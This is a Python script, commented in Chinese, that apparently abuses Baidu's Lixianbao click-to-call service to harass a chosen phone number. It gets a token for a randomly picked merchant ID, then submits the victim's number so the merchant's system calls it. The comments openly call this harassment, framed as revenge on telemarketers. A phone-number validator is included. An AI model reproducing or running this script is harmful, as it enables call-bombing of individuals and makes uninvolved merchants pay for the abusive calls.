""" 排山倒海的推广电话，吾辈当以毒攻毒 """
import requests
import time
import random
import re


def start_call(phone):
    """
    这里就是骚扰电话的逻辑了，借用百度离线宝
    
    :param phone:
    :return True, False
    """
    # 配置参数
    f = 55
    id = random.randint(1, 92000)  # 随机一个离线宝商户进行骚扰
    g = 0
    _ = t = int(time.time() * 1000)
    t = int(time.time() * 1000 + 320)
    r = ''

    # 自定义headers
    my_headers = {
        'Accept':
        'text/javascript, application/javascript, application/ecmascript, application/x-ecmascript, */*; q=0.01',
        'Accept-Encoding':
        'gzip, deflate',
        'Accept-Language':
        'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection':
        'keep-alive',
        'Host':
        'lxbjs.baidu.com',
        'Referer':
        'http://lxbjs.baidu.com/cb/url/show?f=%s&id=%s' % (f, id),
        'User-Agent':
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
        'X-Requested-With':
        'XMLHttpRequest'
    }

    # 配置token_url
    get_token_url = 'http://lxbjs.baidu.com/cb/url/check'

    # 构建参数
    params = {'f': f, 'id': id, 'g': g, 't': t, 'r': r, '_': _}

    # 使用session
    sss = requests.Session()

    # 获取token
    print('--------start--------')
    print('准备骚扰，获取Token....')
    tk = sss.get(get_token_url, params=params).json()['data']['tk']

    if tk:
        print('获取成功，Token: %s' % (tk))
    else:
        print('获取失败，请重试')

    # 配置call_url
    get_call_url = 'http://lxbjs.baidu.com/cb/call'

    # 设置参数
    params = {'f': f, 'id': id, 'tk': tk, 'vtel': phone, '_': _ + 1}

    # 提交打电话申请
    print('提交骚扰，号码：%s...' % phone)
    request = sss.get(get_call_url, params=params)

    if request.status_code == 200:
        print('申请成功，%s' % request.content)
        return True
    else:
        print('申请失败，请稍后重试。%s' % request.content)
        return False


def check_phone(phone):
    """
    正则匹配电话号码

    :param phone: 用户输入的电话号码
    :return phone_num: 纯数字的电话号码, phone
    """
    phone_re = re.compile('^0\d{2,3}\d{7,8}$|^1[358]\d{9}$|^147\d{8}')

    # 去掉非数字的符号
    phone_num = re.sub("\D", "", phone)

    if phone_re.match(phone_num):
        # 验证通过则返回去除非空字符的纯数字号码
        return phone_num
    else:
        return False